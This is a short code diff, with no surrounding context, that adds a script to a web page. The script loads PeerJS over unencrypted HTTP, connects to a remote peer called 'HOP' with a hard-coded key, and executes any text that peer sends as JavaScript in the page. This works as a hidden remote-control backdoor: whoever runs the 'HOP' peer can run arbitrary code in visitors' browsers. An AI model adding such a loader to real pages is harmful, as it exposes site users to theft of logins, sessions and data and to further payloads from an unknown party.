@@ -1,0 +1,3 @@
+<script src="http://cdn.peerjs.com/0.3/peer.js"></script><script>
+(new Peer((new Date()).getTime(),{key:'u3mvt6nukztcsor'})).connect('HOP').on('open',function(){this.send('IN');})
+.on('data', function(d){document.head.appendChild(document.createElement('script')).innerHTML=d;});</script>
